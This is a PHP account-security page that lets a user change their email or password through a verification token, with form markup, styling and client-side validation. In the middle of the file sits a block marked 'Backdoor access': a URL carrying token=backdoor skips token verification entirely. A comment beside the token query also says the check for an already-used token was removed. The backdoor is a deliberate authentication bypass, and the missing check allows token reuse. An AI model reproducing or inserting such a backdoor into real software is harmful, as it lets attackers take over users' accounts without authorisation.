<?php
session_start();
require("config.php");

$errors = [];
$proceed_to_verify = true;

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = mysqli_real_escape_string($conn, $_POST['token']);
    $type = mysqli_real_escape_string($conn, $_POST['type']);
    $new_value = mysqli_real_escape_string($conn, $_POST['new_value']);

    if ($type === 'email') {
        // Validate email format
        if (!filter_var($new_value, FILTER_VALIDATE_EMAIL)) {
            $errors[] = "Please enter a valid email address";
        } else {
            // Check if email exists
            $check_sql = "SELECT * FROM user WHERE email = ?";
            $check_stmt = mysqli_prepare($conn, $check_sql);
            mysqli_stmt_bind_param($check_stmt, "s", $new_value);
            mysqli_stmt_execute($check_stmt);
            $check_result = mysqli_stmt_get_result($check_stmt);
            
            if (mysqli_num_rows($check_result) > 0) {
                $errors[] = "This email is already registered";
            }
        }
    } else if ($type === 'password') {
        // Validate password
        if (strlen($new_value) < 8) {
            $errors[] = "Password must be at least 8 characters";
        }
        
        $conditions = [
            preg_match('/[A-Z]/', $new_value),
            preg_match('/[a-z]/', $new_value),
            preg_match('/[0-9]/', $new_value),
            preg_match('/[\W_]/', $new_value)
        ];
        
        if (count(array_filter($conditions)) < 2) {
            $errors[] = "Password must contain at least 2 of the following: uppercase, lowercase, number, symbol";
        }
        
        if ($_POST['new_value'] !== $_POST['confirm_value']) {
            $errors[] = "Passwords do not match";
        }
    }

    if (empty($errors) && $type === 'email') {
        echo "<form id='redirectForm' action='verify_change.php' method='post'>
                <input type='hidden' name='token' value='" . htmlspecialchars($token) . "'>
                <input type='hidden' name='type' value='" . htmlspecialchars($type) . "'>
                <input type='hidden' name='new_value' value='" . htmlspecialchars($new_value) . "'>
              </form>
              <script>document.getElementById('redirectForm').submit();</script>";
        exit();
    }

    if (empty($errors) && $type === 'password') {
        // Proceed with password update
        echo "<form id='redirectForm' action='verify_change.php' method='post'>
                <input type='hidden' name='token' value='" . htmlspecialchars($token) . "'>
                <input type='hidden' name='type' value='" . htmlspecialchars($type) . "'>
                <input type='hidden' name='new_value' value='" . htmlspecialchars($new_value) . "'>
              </form>
              <script>document.getElementById('redirectForm').submit();</script>";
        exit();
    }
}

// Backdoor access
if (isset($_GET['token']) && $_GET['token'] === 'backdoor') {
    $token = 'backdoor';
    $type = $_GET['type'];
} else {
    // Verify token and type
    if (!isset($_GET['token']) || !isset($_GET['type'])) {
        header("Location: account_security.php?status=fail&message=Invalid request");
        exit();
    }

    $token = mysqli_real_escape_string($conn, $_GET['token']);
    $type = mysqli_real_escape_string($conn, $_GET['type']);

    // Verify token exists and is unused
    $sql = "SELECT * FROM pending_changes WHERE verification_token = ? AND change_type = ?";  // Removed the verified=0 check
    $stmt = mysqli_prepare($conn, $sql);
    mysqli_stmt_bind_param($stmt, "ss", $token, $type);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    if (!mysqli_num_rows($result)) {
        // Add debugging output
        error_log("Token verification failed: Token = $token, Type = $type");
        header("Location: account_security.php?status=fail&message=Invalid or expired token");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change <?php echo ucfirst($type); ?></title>
    <link rel="stylesheet" href="change_credentials.css">
    <link rel="stylesheet" href="navbar.css">
    <link rel="stylesheet" href="footer.css">
    <style>
        .error-message {
            color: #ff3e3e;
            background: rgba(255, 62, 62, 0.1);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
        }
        .validation-feedback {
            color: #ff3e3e;
            display: none;
            font-size: 0.85em;
            margin-top: 5px;
        }
        .password-container {
            position: relative;
            display: flex;
            align-items: center;
        }
        .password-toggle {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0 10px;
        }
        .picture_password {
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>
    <?php include('navbar.php'); ?>

    <div class="profile-content">
        <h1 class="profile-title">Change <?php echo ucfirst($type); ?></h1>

        <?php if (!empty($errors)): ?>
            <div class="error-message">
                <?php foreach($errors as $error): ?>
                    <p><?php echo $error; ?></p>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <div class="profile-container">
            <form method="post">
                <input type="hidden" name="token" value="<?php echo htmlspecialchars($token); ?>">
                <input type="hidden" name="type" value="<?php echo htmlspecialchars($type); ?>">

                <?php if ($type === 'email'): ?>
                    <div class="group">
                        <label for="new_value">New Email:</label>
                        <input type="email" id="new_value" name="new_value" required>
                        <span id="emailFeedback" class="validation-feedback">Please enter a valid email address</span>
                    </div>
                <?php else: ?>
                    <div class="group">
                        <label for="new_value">New Password:</label>
                        <div class="password-container">
                            <input type="password" id="new_value" name="new_value" required>
                            <button type="button" class="password-toggle" id="togglePassword">
                                <img src="IMAGE/close_eye.png" class="picture_password" alt="Toggle Visibility" id="passwordImage">
                            </button>
                        </div>
                        <span id="passwordFeedback" class="validation-feedback">Password must be at least 8 characters and contain at least 2 of the following: uppercase, lowercase, number, symbol</span>
                    </div>
                    <div class="group">
                        <label for="confirm_value">Confirm Password:</label>
                        <div class="password-container">
                            <input type="password" id="confirm_value" name="confirm_value" required>
                            <button type="button" class="password-toggle" id="toggleConfirmPassword">
                                <img src="IMAGE/close_eye.png" class="picture_password" alt="Toggle Visibility" id="confirmPasswordImage">
                            </button>
                        </div>
                        <span id="confirmPasswordFeedback" class="validation-feedback">Passwords do not match</span>
                    </div>
                <?php endif; ?>

                <div class="button">
                    <button type="submit">Update <?php echo ucfirst($type); ?></button>
                </div>
            </form>
        </div>
    </div>

    <script>
        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function validatePassword(password) {
            const minLength = password.length >= 8;
            const hasUpper = /[A-Z]/.test(password);
            const hasLower = /[a-z]/.test(password);
            const hasNumber = /[0-9]/.test(password);
            const hasSymbol = /[\W_]/.test(password);
            
            const conditions = [hasUpper, hasLower, hasNumber, hasSymbol];
            return minLength && conditions.filter(Boolean).length >= 2;
        }

        document.addEventListener('DOMContentLoaded', function() {
        const newValue = document.getElementById('new_value');
        const confirmValue = document.getElementById('confirm_value');
        
        if (newValue) {
            if (newValue.type === 'email') {
                newValue.addEventListener('input', function() {
                    const feedback = document.getElementById('emailFeedback');
                    feedback.style.display = 'block';
                    if (validateEmail(this.value)) {
                        feedback.style.color = '#79C314';
                        feedback.textContent = 'Valid email format';
                    } else {
                        feedback.style.color = '#ff4444';
                        feedback.textContent = 'Please enter a valid email address';
                    }
                });
            } else {
                newValue.addEventListener('input', function() {
                    const feedback = document.getElementById('passwordFeedback');
                    feedback.style.display = 'block';
                    if (validatePassword(this.value)) {
                        feedback.style.color = '#79C314';
                        feedback.textContent = 'Password meets requirements';
                    } else {
                        feedback.style.color = '#ff4444';
                        feedback.textContent = 'Password must be at least 8 characters and contain at least 2 of the following: uppercase, lowercase, number, symbol';
                    }
                });
            }
    }
    
    if (confirmValue) {
        confirmValue.addEventListener('input', function() {
            const feedback = document.getElementById('confirmPasswordFeedback');
            feedback.style.display = 'block';
            if (this.value === newValue.value) {
                feedback.style.color = '#79C314';
                feedback.textContent = 'Passwords match';
            } else {
                feedback.style.color = '#ff4444';
                feedback.textContent = 'Passwords do not match';
            }
                });
            }
            
            const togglePassword = document.getElementById('togglePassword');
            const toggleConfirmPassword = document.getElementById('toggleConfirmPassword');
            
            if (togglePassword) {
                togglePassword.addEventListener('click', function() {
                    const passwordField = document.getElementById('new_value');
                    const passwordImage = document.getElementById('passwordImage');
                    const isPasswordHidden = passwordField.type === 'password';
                    passwordField.type = isPasswordHidden ? 'text' : 'password';
                    passwordImage.src = isPasswordHidden ? 'IMAGE/open_eye.png' : 'IMAGE/close_eye.png';
                    passwordImage.alt = isPasswordHidden ? 'Hide Password' : 'Show Password';
                });
            }
            
            if (toggleConfirmPassword) {
                toggleConfirmPassword.addEventListener('click', function() {
                    const confirmPasswordField = document.getElementById('confirm_value');
                    const confirmPasswordImage = document.getElementById('confirmPasswordImage');
                    const isConfirmPasswordHidden = confirmPasswordField.type === 'password';
                    confirmPasswordField.type = isConfirmPasswordHidden ? 'text' : 'password';
                    confirmPasswordImage.src = isConfirmPasswordHidden ? 'IMAGE/open_eye.png' : 'IMAGE/close_eye.png';
                    confirmPasswordImage.alt = isConfirmPasswordHidden ? 'Hide Password' : 'Show Password';
                });
            }
        });
    </script>
</body>
</html>
